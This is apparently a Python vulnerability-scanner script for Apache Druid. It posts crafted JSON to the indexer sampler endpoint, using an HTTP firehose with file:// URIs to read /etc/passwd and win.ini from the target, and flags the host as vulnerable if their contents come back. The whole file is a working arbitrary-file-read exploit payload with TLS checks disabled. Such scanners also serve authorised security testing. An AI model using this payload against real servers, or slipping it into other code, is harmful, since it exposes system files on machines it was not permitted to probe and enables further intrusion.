import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"druid/indexer/v1/sampler?for=connect"
	body='{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///etc/passwd"]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}'
	headers={'Content-Type': 'application/json;charset=utf-8'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "json" in response.headers["Content-Type"] and "root:" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			druid1=True
		else:
			druid1=False
	else:
		if response.status_code == 200 and "json" in response.headers["Content-Type"] and "root:" in response.text:
			druid1=True
		else:
			druid1=False
	url=baseurl+"druid/indexer/v1/sampler?for=connect"
	body='{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///c://windows/win.ini"]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}'
	headers={'Content-Type': 'application/json;charset=utf-8'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "json" in response.headers["Content-Type"] and "for 16-bit app support" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			druid2=True
		else:
			druid2=False
	else:
		if response.status_code == 200 and "json" in response.headers["Content-Type"] and "for 16-bit app support" in response.text:
			druid2=True
		else:
			druid2=False
	if druid1 or druid2:
		return True
	else:
		return False
